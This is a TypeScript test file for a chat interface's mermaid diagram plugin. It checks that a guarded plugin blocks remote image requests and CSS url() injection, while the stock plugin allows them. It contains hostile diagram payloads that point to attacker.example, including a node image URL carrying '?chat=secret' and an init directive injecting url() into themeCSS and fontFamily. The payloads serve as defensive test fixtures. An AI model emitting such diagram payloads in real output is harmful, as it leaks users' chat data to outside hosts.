// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026-present the Unsloth AI Inc. team. All rights reserved. See /studio/LICENSE.AGPL-3.0

// The render call Streamdown makes once a diagram scrolls into view, on the real mermaid, with
// an Image that records the address a browser would request instead of fetching it.
import assert from "node:assert/strict";
import test from "node:test";
import { DOMImplementation } from "@xmldom/xmldom";

// Imported before the stand-in document: mermaid reaches for `window` on load when one exists.
const { mermaid: stock } = await import("@streamdown/mermaid");
const { mermaid: guarded } = await import("../src/components/assistant-ui/mermaid-plugin.ts");

const requested: string[] = [];
class NoNetwork extends Error {}
const globals = globalThis as Record<string, unknown>;
globals.Image = class {
  set src(url: string) {
    if (url) requested.push(url);
  }
  decode() {
    return Promise.reject(new NoNetwork());
  }
};
globals.CSSStyleSheet = class {
  cssRules: { cssText: string }[] = [];
  insertRule(rule: string) {
    this.cssRules.push({ cssText: rule });
  }
};
const XHTML = "http://www.w3.org/1999/xhtml";
const doc = new DOMImplementation().createDocument(XHTML, "html", null) as unknown as Record<string, unknown> & {
  documentElement: { appendChild(node: unknown): unknown };
  createElementNS(ns: string, name: string): unknown;
};
doc.body = doc.documentElement.appendChild(doc.createElementNS(XHTML, "body"));
function querySelector(this: { getElementsByTagName(name: string): ArrayLike<{ getAttribute(name: string): string | null }> }, selector: string) {
  const id = /^#(.+)$|^\[id="(.+)"\]$/.exec(selector);
  return Array.from(this.getElementsByTagName(id ? "*" : selector)).find((el) => !id || el.getAttribute("id") === (id[1] ?? id[2])) ?? null;
}
const elementProto = Object.getPrototypeOf(doc.body) as Record<string, unknown>;
(Object.getPrototypeOf(doc) as Record<string, unknown>).querySelector = querySelector;
elementProto.querySelector = querySelector;
Object.defineProperty(elementProto, "style", { value: { setProperty() {} } });
globals.document = doc;


const HOSTILE = 'flowchart LR\n  A@{ img: "https://attacker.example/collect?chat=secret", w: 1, h: 1 }';

async function imagesRequestedBy(plugin: typeof stock, source: string, id: string): Promise<string[]> {
  requested.length = 0;
  try {
    await plugin.getMermaid().render(id, source);
  } catch {
    // Without layout the render stops early; the image is requested before that point.
  }
  return [...requested];
}

test("the stock plugin requests a flowchart node's remote image (the harness sees it)", async () => {
  assert.deepEqual(await imagesRequestedBy(stock, HOSTILE, "m1"), ["https://attacker.example/collect?chat=secret"]);
});

test("the guarded plugin draws the same diagram without requesting it", async () => {
  assert.deepEqual(await imagesRequestedBy(guarded, HOSTILE, "m2"), []);
});

test("an inline data: image is still drawn", async () => {
  const data = "data:image/png;base64,iVBORw0KGgo=";
  assert.deepEqual(await imagesRequestedBy(guarded, `flowchart LR\n  A@{ img: "${data}", w: 1, h: 1 }`, "m3"), [data]);
});

test("an init directive cannot write a url() into the diagram's CSS", async () => {
  const { default: library } = await import("mermaid");
  const source =
    '%%{init: {"themeCSS": ".node{background:url(https://attacker.example/a)}", "fontFamily": "x;background:url(https://attacker.example/b)"}}%%\nflowchart LR\n  A-->B';
  const applied = async (plugin: typeof stock) => {
    try {
      await plugin.getMermaid({}).render("m4", source);
    } catch {
      // Directives are applied before layout, where the stand-in stops.
    }
    const { themeCSS, fontFamily } = library.mermaidAPI.getConfig();
    return { themeCSS, fontFamily };
  };
  assert.match(String((await applied(stock)).themeCSS), /attacker/, "the harness should see the stock plugin take the directive");
  // The plugin's own font still applies; only the diagram's directive is refused.
  assert.deepEqual(await applied(guarded), { themeCSS: undefined, fontFamily: "monospace" });
});
